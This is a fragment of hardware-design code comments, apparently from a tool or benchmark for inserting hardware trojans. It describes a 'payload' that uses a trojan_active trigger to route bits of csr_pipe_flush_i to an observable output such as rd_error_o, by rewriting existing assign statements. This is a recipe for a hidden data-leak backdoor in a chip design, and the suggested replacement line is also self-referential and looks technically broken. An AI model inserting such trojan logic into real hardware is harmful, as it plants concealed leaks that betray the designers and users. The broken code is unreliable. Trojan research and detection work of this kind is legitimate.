 ...
 * Payload: Route csr_pipe_flush_i[0] to observable output
 * 
...
//   Find the assign for csr_pipe_flush_i (or rd_error_o as fallback):
//     assign csr_pipe_flush_i = <normal_expr>;
//   Replace with:
//     assign csr_pipe_flush_i = trojan_active ? csr_pipe_flush_i[leak_bit_idx] : (<normal_expr>);
//
...
//   assign rd_error_o = trojan_active ? csr_pipe_flush_i[0] : 1'b0;
//
